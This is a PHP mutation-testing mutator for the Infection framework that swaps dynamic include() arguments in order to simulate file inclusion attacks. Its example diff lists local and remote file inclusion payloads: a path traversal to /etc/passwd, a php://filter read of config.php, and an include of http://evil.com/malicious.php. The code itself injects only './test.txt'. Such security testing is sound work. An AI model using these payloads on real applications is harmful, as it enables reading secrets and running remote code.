<?php

declare(strict_types=1);

namespace App\Mutator;

use PhpParser\Node;
use PhpParser\Node\Expr\Include_;
use PhpParser\Node\Scalar\String_;
use Infection\Mutator\Definition;
use Infection\Mutator\MutatorCategory;
use Infection\Mutator\Mutator;

final class FileInclusionMutator implements Mutator
{
    public function canMutate(Node $node): bool
    {
        return $node instanceof Include_ &&
               !$node->expr instanceof String_; // targetnya variabel dinamis
    }

    public function mutate(Node $node): iterable
    {
        $payloads = [
            './test.txt',
        ];

        foreach ($payloads as $payload) {
            yield new Include_(
                new String_($payload),
                $node->type
            );
        }
    }

    public static function getDefinition(): Definition
    {
        return new Definition(
            <<<'TXT'
                Simulates file inclusion attack by injecting path traversal or remote file into include().
                TXT,
            MutatorCategory::ORTHOGONAL_REPLACEMENT,
            null,
            <<<'DIFF'
                - include($file);
                + include("../../etc/passwd");
                + include("php://filter/convert.base64-encode/resource=config.php");
                + include("http://evil.com/malicious.php");
                DIFF
        );
    }

    public function getName(): string
    {
        return self::class;
    }
}
